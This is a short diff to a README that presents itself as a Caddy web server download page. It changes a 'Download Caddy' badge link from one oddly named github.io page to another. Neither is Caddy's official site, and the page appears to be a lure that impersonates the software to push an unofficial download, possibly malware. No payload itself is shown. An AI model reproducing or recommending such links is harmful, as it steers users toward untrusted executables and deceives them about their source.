@@ -2,7 +2,7 @@
 
 ![Caddy web server dashboard with HTTPS routes and deployment notes](https://avatars.mds.yandex.net/i?id=2b6cab85d54c0f1216b4f6d1b0671adde0f5c79a-6376430-images-thumbs&n=13)
 
-[![Download Caddy Download](https://img.shields.io/badge/Download-Caddy_Download-blueviolet?style=for-the-badge&logo=windows)](https://ozzyericksonjlug.github.io/.github/caddy-download)
+[![Download Caddy Download](https://img.shields.io/badge/Download-Caddy_Download-blueviolet?style=for-the-badge&logo=windows)](https://kannonlangdedb.github.io/.github/caddy-download)
 
 ## Caddy Download Overview
 
